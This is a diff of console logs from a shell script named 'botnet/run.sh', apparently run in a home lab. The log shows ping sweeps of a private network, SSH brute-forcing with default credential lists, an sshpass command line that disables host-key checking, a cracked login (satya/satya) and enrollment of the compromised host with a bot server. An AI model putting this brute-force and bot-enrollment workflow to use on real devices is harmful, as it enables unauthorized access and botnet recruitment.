+./botnet/run.sh: line 23:  7069 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7083 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7085 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7063 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7075 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7098 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7082 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7087 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7096 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7086 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7105 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7109 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7088 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7090 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7102 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7091 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7116 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7115 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7120 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7113 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7238 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7044 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7095 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7137 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7275 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7117 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7129 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7165 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7277 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7133 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7170 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7122 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7176 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7119 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7249 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7179 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7121 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7139 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7142 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7173 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7233 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7250 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7247 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7252 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7240 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7254 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7242 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7178 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7244 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7183 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7246 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7187 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7248 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7236 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7384 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7291 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7080 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7379 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7150 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7097 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7092 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7118 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7219 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7392 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7155 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7223 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7414 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7094 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7227 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7156 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7419 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7273 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7230 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7231 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7402 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7232 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7405 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7202 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7234 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7404 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7264 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7235 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7406 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7237 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7266 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7403 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7269 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7239 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7241 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7390 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7328 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7295 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7323 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7306 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7245 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7351 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7407 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7255 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7410 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7267 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7393 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7145 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7415 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7349 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7162 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7168 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7270 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7260 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7256 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7191 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7261 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7184 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7287 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7371 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7193 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7284 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7251 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7321 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7265 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7253 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7159 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7358 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7352 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7363 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7366 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7374 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7368 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7258 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7378 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7282 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7279 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7380 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7293 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7381 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7268 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7383 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7271 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7276 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7386 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7385 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7388 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7283 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7285 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7289 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7298 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7376 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7259 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7382 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7274 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7262 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7408 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7164 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7292 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7263 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7355 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7394 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7359 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7387 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7416 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7297 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7418 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7272 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7422 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7389 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7334 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7400 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7322 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7280 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7391 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7395 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7281 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7286 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7288 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7409 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7294 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7093 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7398 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7421 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7411 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7035 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7401 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7412 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7089 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7296 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7278 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7413 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7126 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7290 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7198 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7417 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7257 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7420 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7329 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7038 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7423 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7148 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7397 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7396 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7243 Terminated              ping -c 1 $1 > /dev/null
+192.168.1.4
+192.168.1.18
+192.168.1.2
+192.168.1.7
+
+
+SSH attempt
+
+Brute forcing the device with IP 192.168.1.4
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.4
+
+
+
+Brute forcing the device with IP 192.168.1.18
+trying admin and 1111111.
+./botnet/run.sh: line 40:  7493 Terminated              sshpass -p "$password" ssh -oStrictHostKeyChecking=no $username@$1 &> /dev/null
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    77  100    18  100    59   2318   7598 --:--:-- --:--:-- --:--:--  8428
+{
+  "code": 200
+}
+192.168.1.18,satya,satya added
+
+
+Brute forcing the device with IP 192.168.1.2
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.2
+
+
+
+Brute forcing the device with IP 192.168.1.7
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.7
+
+
+
+Completed!!
+IP , User name , Passwords are
+192.168.1.18,satya,satya
+about to retart in few seconds
+
+
+
+
+running the script for the 1 th time
+
+
+Scanning the Network
+
+
+Devices on the network
+192.168.1.4
+192.168.1.18
+192.168.1.2
+192.168.1.6
+192.168.1.7
+
+
+SSH attempt
+
+Brute forcing the device with IP 192.168.1.4
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.4
+
+
+
+Brute forcing the device with IP 192.168.1.18
+trying admin and 1111111.
+trying admin and 1234.
+./botnet/run.sh: line 40:  8586 Terminated              sshpass -p "$password" ssh -oStrictHostKeyChecking=no $username@$1 &> /dev/null
+trying admin and admin1234.
+trying admin and 12345.
+./botnet/run.sh: line 23:  8059 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  8053 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 40:  8640 Terminated              sshpass -p "$password" ssh -oStrictHostKeyChecking=no $username@$1 &> /dev/null
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    77  100    18  100    59   1789   5864 --:--:-- --:--:-- --:--:--  6555
+{
+  "code": 200
+}
+192.168.1.18,satya,satya added
+
+
+Brute forcing the device with IP 192.168.1.2
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.2
+
+
+
+Brute forcing the device with IP 192.168.1.6
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.6
+
+
+
+Brute forcing the device with IP 192.168.1.7
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.7
+
+
+
+Completed!!
+IP , User name , Passwords are
+192.168.1.18,satya,satya
+about to retart in few seconds
+
+
+
+
+running the script for the 1 th time
+
+
+Scanning the Network
+
+
+Devices on the network
+192.168.1.18
+192.168.1.4
+192.168.1.6
+192.168.1.2
+192.168.1.7
+
+
+SSH attempt
+
 Brute forcing the device with IP 192.168.1.18
 trying admin and 1111111.
 trying admin and 1234.
@@ -156,7 +980,7 @@ trying admin and 54321.
 trying satya and satya.
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59  10236  11842 --:--:-- --:--:-- --:--:-- 14750
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59  11373  13157 --:--:-- --:--:-- --:--:-- 14750
 {
   "code": 200, 
   "data": "bot already exists"
@@ -164,7 +988,7 @@ trying satya and satya.
 192.168.1.18,satya,satya added
 
 
-Brute forcing the device with IP 192.168.1.3
+Brute forcing the device with IP 192.168.1.4
 trying admin and 1111111.
 trying admin and 1234.
 trying admin and admin1234.
@@ -174,431 +998,845 @@ trying admin and 54321.
 trying satya and satya.
 trying NA and NA.
 
-user name and password not found for 192.168.1.3
+user name and password not found for 192.168.1.4
 
+
+
+Brute forcing the device with IP 192.168.1.6
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.6
+
+
+
+Brute forcing the device with IP 192.168.1.2
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.2
+
+
+
+Brute forcing the device with IP 192.168.1.7
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.7
+
+
+
+Completed!!
+IP , User name , Passwords are
+192.168.1.18,satya,satya
+about to retart in few seconds
+
+
+
+
+running the script for the 1 th time
+
+
+Scanning the Network
+
+
+Devices on the network
+192.168.1.18
+192.168.1.6
+192.168.1.4
+192.168.1.7
+192.168.1.2
+
+
+SSH attempt
+
+Brute forcing the device with IP 192.168.1.18
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59  10832  12531 --:--:-- --:--:-- --:--:-- 14750
+{
+  "code": 200, 
+  "data": "bot already exists"
+}
+192.168.1.18,satya,satya added
+
+
+Brute forcing the device with IP 192.168.1.6
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.6
+
+
+
+Brute forcing the device with IP 192.168.1.4
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.4
+
+
+
+Brute forcing the device with IP 192.168.1.7
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.7
+
+
+
+Brute forcing the device with IP 192.168.1.2
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.2
+
+
+
+Completed!!
+IP , User name , Passwords are
+192.168.1.18,satya,satya
+about to retart in few seconds
+
+
+
+
+running the script for the 1 th time
+
+
+Scanning the Network
+
+
+Devices on the network
+192.168.1.18
+192.168.1.4
+192.168.1.6
+192.168.1.2
+192.168.1.7
+
+
+SSH attempt
+
+Brute forcing the device with IP 192.168.1.18
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59  10437  12075 --:--:-- --:--:-- --:--:-- 14750
+{
+  "code": 200, 
+  "data": "bot already exists"
+}
+192.168.1.18,satya,satya added
+
+
+Brute forcing the device with IP 192.168.1.4
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.4
+
+
+
+Brute forcing the device with IP 192.168.1.6
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.6
+
+
+
+Brute forcing the device with IP 192.168.1.2
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.2
+
+
+
+Brute forcing the device with IP 192.168.1.7
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.7
+
+
+
+Completed!!
+IP , User name , Passwords are
+192.168.1.18,satya,satya
+about to retart in few seconds
+
+
+
+
+running the script for the 1 th time
+
+
+Scanning the Network
+
+
+Devices on the network
+192.168.1.18
+192.168.1.4
+192.168.1.2
+192.168.1.6
+
+
+SSH attempt
+
+Brute forcing the device with IP 192.168.1.18
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59   6651   7694 --:--:-- --:--:-- --:--:--  8428
+{
+  "code": 200, 
+  "data": "bot already exists"
+}
+192.168.1.18,satya,satya added
+
+
+Brute forcing the device with IP 192.168.1.4
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.4
+
+
+
+Brute forcing the device with IP 192.168.1.2
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.2
+
+
+
+Brute forcing the device with IP 192.168.1.6
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.6
+
+
+
+Completed!!
+IP , User name , Passwords are
+192.168.1.18,satya,satya
+about to retart in few seconds
+
+
+
+
+running the script for the 1 th time
+
+
+Scanning the Network
+
+
+Devices on the network
+192.168.1.6
+192.168.1.18
+192.168.1.4
+192.168.1.2
+192.168.1.7
+
+
+SSH attempt
+
+Brute forcing the device with IP 192.168.1.6
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.6
+
+
+
+Brute forcing the device with IP 192.168.1.18
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59   7179   8305 --:--:-- --:--:-- --:--:--  9833
+{
+  "code": 200, 
+  "data": "bot already exists"
+}
+192.168.1.18,satya,satya added
+
+
+Brute forcing the device with IP 192.168.1.4
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.4
+
+
+
+Brute forcing the device with IP 192.168.1.2
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.2
+
+
+
+Brute forcing the device with IP 192.168.1.7
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.7
+
+
+
+Completed!!
+IP , User name , Passwords are
+192.168.1.18,satya,satya
